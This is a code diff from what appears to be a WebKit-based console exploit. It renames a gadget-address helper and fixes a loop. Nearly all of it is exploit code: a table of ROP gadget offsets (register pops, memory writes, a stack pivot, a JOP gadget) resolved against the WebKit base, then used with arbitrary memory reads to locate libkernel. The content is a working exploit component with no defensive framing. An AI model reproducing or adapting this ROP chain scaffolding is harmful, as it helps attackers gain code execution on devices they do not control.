@@ -56,7 +56,7 @@ var deref_stub_jmp = function(addr) {
   
   return addr.add32(y + 6);
 }
-var geto2wk = function(o)
+var gadget = function(o)
     {
         return webKitBase.add32(o);
     }
@@ -72,32 +72,32 @@ var geto2wk = function(o)
       kchain.push(window.gadgets["mov [rdi], rax"]);
       */
           gadgets = {    
-  "ret":                    geto2wk(0x3C),
-  "jmp rax":                geto2wk(0x82),
-  "ep":                     geto2wk(0xAD),
-  "pop rbp":                geto2wk(0xB6),
-  "mov [rdi], rax":         geto2wk(0x3FBA),
-  "pop r8":                 geto2wk(0xCC42),
-  "pop rax":                geto2wk(0xCC43),
-  "mov rax, rdi":           geto2wk(0xE84E),
-  "mov rax, [rax]":         geto2wk(0x130A3),
-  "mov rdi, rax; jmp rcx":  geto2wk(0x3447A), 
-  "pop rsi":                geto2wk(0x7B1EE),
-  "pop rdi":                geto2wk(0x7B23D),
-  "add rsi, rcx; jmp rsi":  geto2wk(0x1FA5D4),
-  "pop rcx":                geto2wk(0x271DE3),
-  "pop rsp":                geto2wk(0x27A450),
-  "mov [rdi], rsi":         geto2wk(0x39CF70),
-  "mov [rax], rsi":         geto2wk(0x2565a7),
-  "add rsi, rax; jmp rsi":  geto2wk(0x2e001),
-  "pop rdx":                geto2wk(0xdedc2),
-  "pop r9":                 geto2wk(0xbb30cf),
-  "add rax, rcx":           geto2wk(0x15172),
-  "jop":                    geto2wk(0xc37d0),
-  "infloop":                geto2wk (0x12C4009),
+  "ret":                    gadget(0x3C),
+  "jmp rax":                gadget(0x82),
+  "ep":                     gadget(0xAD),
+  "pop rbp":                gadget(0xB6),
+  "mov [rdi], rax":         gadget(0x3FBA),
+  "pop r8":                 gadget(0xCC42),
+  "pop rax":                gadget(0xCC43),
+  "mov rax, rdi":           gadget(0xE84E),
+  "mov rax, [rax]":         gadget(0x130A3),
+  "mov rdi, rax; jmp rcx":  gadget(0x3447A), 
+  "pop rsi":                gadget(0x7B1EE),
+  "pop rdi":                gadget(0x7B23D),
+  "add rsi, rcx; jmp rsi":  gadget(0x1FA5D4),
+  "pop rcx":                gadget(0x271DE3),
+  "pop rsp":                gadget(0x27A450),
+  "mov [rdi], rsi":         gadget(0x39CF70),
+  "mov [rax], rsi":         gadget(0x2565a7),
+  "add rsi, rax; jmp rsi":  gadget(0x2e001),
+  "pop rdx":                gadget(0xdedc2),
+  "pop r9":                 gadget(0xbb30cf),
+  "add rax, rcx":           gadget(0x15172),
+  "jop":                    gadget(0xc37d0),
+  "infloop":                gadget (0x12C4009),
 
-        "memset": geto2wk(0x228),
-        "setjmp": geto2wk(0x14f8)
+        "memset": gadget(0x228),
+        "setjmp": gadget(0x14f8)
     };  
    
 ;var reenter_help = { length:
@@ -135,8 +135,8 @@ try {
     }
 
     // Set gadgets to proper addresses
-    for(var gadget in geto2wk) {
-      geto2wk[gadgets] = offsetToWebKit(geto2wk[gadgets]);
+    for(var gadget in gadgets) {
+      gadgets[gadget] = offsetToWebKit(gadgets[gadget]);
     }   
 
     var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
